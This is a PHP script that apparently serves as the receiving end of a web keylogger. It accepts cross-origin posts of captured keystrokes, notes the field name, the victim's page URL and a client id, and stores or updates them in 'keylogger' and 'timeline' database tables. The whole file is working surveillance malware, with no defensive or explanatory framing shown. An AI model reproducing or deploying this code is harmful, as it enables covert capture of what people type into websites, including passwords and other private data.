<?php
header("Access-Control-Allow-Origin: *");

require_once ('../includes/functions.php');



$jsTimestamp = substr($_GET["t"], 0, -3);

$refererUrl = $_SERVER['HTTP_REFERER'];


$data = file_get_contents('php://input');

list($keylogData, $inputField) = explode("&&", $data);


$clientUniq = $_GET["uid"];

$uniq = md5($clientUniq . $jsTimestamp . $refererUrl . $inputField);
$timelineUniq = md5($clientUniq . $jsTimestamp . $refererUrl);

$db->bind("unique_id", $uniq);

$dataCheck = $db->query("SELECT * FROM keylogger WHERE unique_id = :unique_id ");

if (empty($dataCheck)) {
    
    $db->bindMore(array(
        "client_id" => $clientUniq,
        "unique_id" => $uniq,
        "keylog_id" => $timelineUniq,
        "page_load" => $jsTimestamp,
        "website" => $refererUrl,
        "field_name" => $inputField,
        "keylog_data" => $keylogData
    ));
    
    $db->query("INSERT INTO keylogger (`client_id`,  `unique_id`, `keylog_id`, `page_load`,  `website`, `field_name`, `keylog_data`, `time`) 
            VALUES (:client_id, :unique_id, :keylog_id, :page_load, :website, :field_name, :keylog_data, NOW() )");
    
    $db->bind("unique_id", $timelineUniq);
    

    ///////////////////////////////////////////////////////////////////////////////////////
    $timelineCheck = $db->single("SELECT id FROM timeline WHERE unique_id = :unique_id");
    
    if (empty($timelineCheck)) {
        
        $db->bindMore(array(
            "client_id" => $clientUniq,
            "unique_id" => $timelineUniq,
            "page_load" => $jsTimestamp,
            "website" => $refererUrl,
            "type" => "keylog"
        ));
        
        $db->query("INSERT INTO timeline ( `client_id`, `unique_id`,  `page_load`, `website`, `type`, `time`) 
            VALUES (:client_id, :unique_id, :page_load, :website, :type, NOW() )");
    }
    ///////////////////////////////////////////////////////////////////////////////////////
} 
else {
    
    $db->bind("keylog_data", $keylogData);
    $db->bind("unique_id", $uniq);
    
    $db->query("UPDATE keylogger SET keylog_data = :keylog_data WHERE unique_id = :unique_id");
}
?>